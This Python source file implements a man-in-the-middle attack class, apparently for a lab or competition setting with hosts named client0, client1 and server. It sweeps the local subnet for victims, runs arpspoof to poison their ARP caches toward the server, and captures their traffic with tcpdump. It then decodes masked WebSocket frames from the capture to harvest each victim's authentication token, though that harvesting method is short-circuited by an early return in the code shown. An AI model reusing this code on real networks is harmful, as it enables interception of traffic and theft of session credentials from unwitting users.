import json
import logging
import os
import socket
import subprocess
from sys import stderr, stdout
from threading import Thread
import time
from typing import Optional
import netifaces

def decodedCharArrayFromByteStreamIn(byteArray):
    datalength = byteArray[1] & 127
    indexFirstMask = 2 
    if datalength == 126:
        indexFirstMask = 4
    elif datalength == 127:
        indexFirstMask = 10
    masks = [m for m in byteArray[indexFirstMask : indexFirstMask+4]]
    indexFirstDataByte = indexFirstMask + 4
    decodedChars = []
    i = indexFirstDataByte
    j = 0
    while i < len(byteArray):
        decodedChars.append( chr(byteArray[i] ^ masks[j % 4]) )
        i += 1
        j += 1
    return "".join(decodedChars)

def get_ip_address_service(service_name) -> Optional[str]:
    try:
        ip_address = socket.gethostbyname(service_name)
        return ip_address
    except:
        return None

def get_ip_address_interface(interface) -> Optional[str]:
    try:
        addresses = netifaces.ifaddresses(interface)
        ip_address = addresses[netifaces.AF_INET][0]['addr']
        return ip_address
    except:
        return None

def get_hostname(ip_address) -> Optional[str]:
    try:
        hostname, _, _ = socket.gethostbyaddr(ip_address)
        return hostname
    except:
        return None

class MITM:

    def __init__(self, server: str):
        start_t = time.time()
        self.hacker_addr = get_ip_address_interface('eth0')
        client0 = get_ip_address_service('client0')
        client1 = get_ip_address_service('client1')
        self.server_addr = get_ip_address_service('server')
        if client0 and client1 and self.server_addr and self.hacker_addr in [client0, client1]:
            clients_addr = [client0, client1]
            clients_addr.remove(self.hacker_addr)
        else:
            self.server_addr = server.replace("ws://", "").split(":")[0]
            if self.server_addr.count(".") < 3:
                self.server_addr = get_ip_address_service(self.server_addr)
            pref = self.hacker_addr.rsplit('.', maxsplit=1)[0]
            clients_addr = []
            cnt_fail = 0
            for i in range(2, 255):
                addr = f"{pref}.{i}"
                if addr == self.hacker_addr or addr == self.server_addr:
                    continue
                host = get_hostname(addr)
                if host:
                    clients_addr.append(addr)
                    cnt_fail = 0
                else:
                    cnt_fail += 1
                    if cnt_fail >= 10:
                        break
        self.victim_pcap = "victim.pcap"  # Packets from victim to server
        self.server_pcap = "server.pcap"  # Packets from server to victim
        if len(clients_addr) > 1:
            self.is_multi = True
            self.victim_addr = None
            self.enemies_addr = clients_addr
            cmd = ["arpspoof"]
            for addr in clients_addr:
                cmd.append("-t")
                cmd.append(addr)
            cmd.append(self.server_addr)
            self.arpspoof = subprocess.Popen(cmd,
                                             stdout=subprocess.PIPE,
                                             stderr=subprocess.PIPE)
            cmd = ["tcpdump", "-n", "-w", self.victim_pcap, "-U",
                   "dst", "host", self.server_addr, "and",
                   "src", "host", "not", self.hacker_addr]
            self.tcpdump = subprocess.Popen(cmd,
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE)
            self.addr_to_token = dict()
            self.victim_token = None
        elif len(clients_addr) == 1:
            self.is_multi = False
            self.victim_addr = clients_addr[0]
            self.arpspoof = subprocess.Popen(["arpspoof", "-t", self.victim_addr, self.server_addr],
                                             stdout=subprocess.PIPE,
                                             stderr=subprocess.PIPE)
            self.timer = time.time()
            self.tcpdump = subprocess.Popen(["tcpdump", "-n", "-w", self.victim_pcap, "-U", "src", "host", self.victim_addr],
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE)
            cmd = ["tcpdump", "-n", "-w", self.server_pcap, "-U",
                   "src", "host", self.server_addr, "and",
                   "dst", "host", self.victim_addr]
            self.rev_tcpdump = subprocess.Popen(cmd,
                                                stdout=subprocess.PIPE,
                                                stderr=subprocess.PIPE)
            self.victim_token = None
            self.victim_port = None
        else:
            print("Failed to get clients")
            logging.error("Failed to get clients addresses")
        # print(f"Network init time: {time.time() - start_t}")

    def get_token(self, timeout: Optional[float] = None) -> bool:
        from scapy.all import rdpcap, IP, TCP
        try:
            if True:
                return False
            start_t = time.time()
            while not os.path.exists(self.victim_pcap):
                time.sleep(0.1)
                elaps = time.time() - start_t
                if timeout and elaps >= timeout:
                    return False
            while not self.victim_token:
                for packet in rdpcap(self.victim_pcap, count=1000):
                    try:
                        if not (IP in packet and TCP in packet):
                            continue
                        ip_layer = packet[IP]
                        tcp_layer = packet[TCP]
                        src_ip = ip_layer.src
                        dst_ip = ip_layer.dst
                        seq_num = tcp_layer.seq
                        if getattr(tcp_layer, 'payload', None):
                            text = decodedCharArrayFromByteStreamIn(bytes(tcp_layer.payload))
                            self.victim_port = tcp_layer.sport
                            self.server_port = tcp_layer.dport
                            if text:
                                data = json.loads(text)
                                if self.is_multi:
                                    self.addr_to_token[src_ip] = data["token"]
                                    if len(self.addr_to_token) == len(self.enemies_addr):
                                        print(f"All {len(self.addr_to_token)} collected")
                                        return True
                                else:
                                    self.victim_token = data["token"]
                    except Exception as e:
                        pass
                time.sleep(0.1)
                elaps = time.time() - start_t
                if timeout and elaps >= timeout:
                    return self.is_multi and self.addr_to_token  # Return True if at least one of them is successful
            print(f"TK time: {time.time() - start_t}", flush=True)
            return True
        except Exception as e:
            print(f"Error TK: {e}")
        return False

    def exit(self):
        self.tcpdump.kill()
        self.arpspoof.kill()
        if hasattr(self, "disconnect_thread"):
            pass




